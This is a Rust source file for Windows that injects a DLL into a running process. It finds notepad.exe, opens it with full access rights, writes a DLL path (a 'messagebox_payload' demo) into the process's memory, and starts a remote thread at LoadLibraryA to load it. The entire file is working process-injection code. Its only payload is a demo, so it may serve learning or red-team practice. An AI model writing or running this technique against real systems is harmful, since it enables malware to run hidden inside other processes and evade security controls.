
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::VirtualAllocEx;
use windows_sys::Win32::System::Threading::{OpenProcess, CreateRemoteThread, LPTHREAD_START_ROUTINE, WaitForSingleObject};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress,GetModuleHandleA};
use windows_sys::Win32::{System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,PROCESSENTRY32W}, Foundation::{GetLastError, CloseHandle}};
use std::ffi::c_void;
use std::ptr::{null, null_mut};
use std::mem;

fn main(){

    let mut process_entry: PROCESSENTRY32W =  unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

    let snapshot_handle = unsafe { CreateToolhelp32Snapshot(0x00000002, 0) };

    if snapshot_handle == 0 {
        println!("Error creating snapshot: {:?}", unsafe { GetLastError() });
        return;
    }


    let target_names = ["notepad.exe"];
    let mut target_pids = Vec::new();

    let mut success = unsafe { Process32FirstW(snapshot_handle, &mut process_entry) };
    println!("Initial Process32FirstW success: {:?}", success);
    while success != 0 {
        let process_name_raw = unsafe { 
            let len = process_entry.szExeFile.iter().position(|&x| x == 0).unwrap_or(0);
            String::from_utf16_lossy(&process_entry.szExeFile[0..len]) 
        };

    if target_names.contains(&process_name_raw.as_str()) {
        let process_pid = unsafe { process_entry.th32ProcessID };
        target_pids.push(process_pid);
        println!("Found target process: {}: {}", process_name_raw, process_pid);
    }

    success = unsafe { Process32NextW(snapshot_handle, &mut process_entry) };
    println!("Process32NextW success: {:?}", success);
    }

    let open_handle_to_first = unsafe {
        OpenProcess(0x000F0000 | 0x00100000 | 0xFFFF, 1, target_pids[0])
    };
    
    if open_handle_to_first == 0{
        println!("failed to open handle {:?}", unsafe{ GetLastError()})
    }
    println!("Open handle to first process: {:?}", open_handle_to_first);
    //change it to yours
    let path_to_dll = "C:\\Users\\Administrator\\Desktop\\code\\messagebox_payload\\target\\debug\\rust_dll_demo.dll\0";
    let path_dll_size = path_to_dll.len();
    let allocated_res = unsafe {
        VirtualAllocEx(open_handle_to_first, null(), path_dll_size, 0x00001000 | 0x00002000, 0x04)
    };
    if allocated_res.is_null(){
        println!("failed to open handle {:?}", unsafe{ GetLastError()})
    }
    println!("Memory allocation result: {:?}", allocated_res);

    let write_to_memory_result = unsafe {
        WriteProcessMemory(open_handle_to_first, allocated_res, path_to_dll.as_ptr() as *const c_void, path_dll_size, null_mut())
    };
    if write_to_memory_result == 0{
        println!("failed write to memmory {:?}", unsafe{ GetLastError()})
    }
    println!("Write to memory result: {:?}", write_to_memory_result);
    


    let h_kernel32 = unsafe { GetModuleHandleA("kernel32.dll\0".as_ptr() as *const u8) };
    if h_kernel32 == 0 {
        println!("Failed to get handle to kernel32.dll: {:?}", unsafe { GetLastError() });
        return;
    }
    println!("Handle to kernel32.dll: {:?}", h_kernel32);
    
    let p_loadlibrarya = unsafe { GetProcAddress(h_kernel32, "LoadLibraryA\0".as_ptr() as *const u8) };
    if p_loadlibrarya.is_none() {
        println!("Failed to get address of LoadLibraryA: {:?}", unsafe { GetLastError() });
        return;
    }
    let p_loadlibrarya: LPTHREAD_START_ROUTINE = unsafe { mem::transmute(p_loadlibrarya) };
    
    let create_remote_thread = unsafe {
        CreateRemoteThread(open_handle_to_first, null(), 0, p_loadlibrarya, allocated_res, 0, null_mut())
    };

    if create_remote_thread == 0 {
        println!("Failed to create remote thread: {:?}", unsafe { GetLastError() });
    } else {
        println!("Create remote thread result: {:?}", create_remote_thread);
        // Wait for the remote thread to complete
        let wait_result = unsafe { WaitForSingleObject(create_remote_thread, u32::MAX) };
        if wait_result != 0 {
            println!("Wait for single object failed: {:?}", unsafe { GetLastError() });
        }
    
        // Close the handle to the remote thread
        let close_thread_result = unsafe { CloseHandle(create_remote_thread) };
        if close_thread_result == 0 {
            println!("Failed to close handle to remote thread: {:?}", unsafe { GetLastError() });
        }
        println!("Close thread result: {:?}", close_thread_result);
    }

    unsafe { CloseHandle(snapshot_handle) };
    println!("Closed snapshot handle");
}

